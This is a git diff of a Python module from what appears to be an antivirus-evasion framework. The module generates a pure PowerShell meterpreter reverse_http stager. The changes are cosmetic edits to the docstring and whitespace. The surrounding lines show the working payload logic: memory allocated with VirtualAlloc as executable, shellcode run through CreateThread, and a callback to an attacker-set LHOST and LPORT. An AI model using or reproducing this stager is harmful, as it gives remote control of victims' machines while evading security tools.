@@ -1,10 +1,8 @@
 """
+Custom-written pure powershell meterpreter/reverse_http stager
 
-Custom-written pure powershell meterpreter/reverse_http stager.
-
-Module by @harmj0y
+Module built by @harmj0y
 Updated by @ChrisTruncer
-
 """
 
 from Tools.Evasion.evasion_common import evasion_helpers
@@ -72,7 +70,7 @@ $x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Mar
 $o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %((int(self.required_options["STAGERURILENGTH"][0])-1),
                                                                               "" if self.required_options["PROXY"][0] == "N" else proxyString,
                                                                               self.required_options["USER_AGENT"][0],
-                                                                              self.required_options["LHOST"][0], 
+                                                                              self.required_options["LHOST"][0],
                                                                               self.required_options["LPORT"][0],
                                                                               "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])
         baseString += '}\n' * num_ends
